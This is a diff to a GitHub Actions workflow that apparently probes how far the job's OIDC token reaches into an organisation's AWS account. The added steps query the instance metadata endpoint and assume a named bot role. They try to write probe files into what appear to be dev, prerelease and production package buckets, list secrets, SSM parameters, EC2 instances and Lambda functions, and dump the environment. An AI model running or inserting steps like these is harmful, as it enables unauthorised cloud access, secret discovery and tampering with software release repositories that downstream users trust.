@@ -14,17 +14,26 @@ jobs:
           TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null || true
           echo
-      - name: assume
-        id: assume
+      - name: seat
+        run: id; hostname; cat /etc/hostname; uname -a; curl -s -m 5 http://169.254.169.254/latest/meta-data/instance-id || true
+      - name: assume A
         continue-on-error: true
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::962042992619:role/chainflip-github-bot
           aws-region: eu-central-1
-      - name: identity and write probe
+      - name: aws A
+        continue-on-error: true
         run: |
-          aws sts get-caller-identity || true
-          aws s3api put-object --bucket apt.aws.chainflip.xyz --key w5probe/oidc.txt --body /etc/hostname && echo PUT_OK || echo PUT_FAIL
-          aws s3api list-objects-v2 --bucket apt.aws.chainflip.xyz --prefix w5probe/ --max-items 5 || true
+          aws sts get-caller-identity
+          aws iam list-attached-role-policies --role-name chainflip-github-bot 2>&1 | head -30
+          aws s3api put-object --bucket apt.aws.chainflip.xyz --key w5probe/oidc.txt --body /etc/hostname && echo PUT_DEV_OK
+          aws s3api put-object --bucket chainflip-mainnet-prerelease --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PRE_OK
+          aws s3api put-object --bucket repo.chainflip.io --key w5probe/oidc.txt --body /etc/hostname && echo PUT_PROD_OK
+          aws s3 ls
+          aws secretsmanager list-secrets 2>&1 | head -40
+          aws ssm describe-parameters --max-items 20 2>&1 | head -30
+          aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' --output text 2>&1 | head -40
+          aws lambda list-functions --query 'Functions[].[FunctionName,Runtime]' --output text 2>&1 | head -20
       - name: env
         run: env | sort
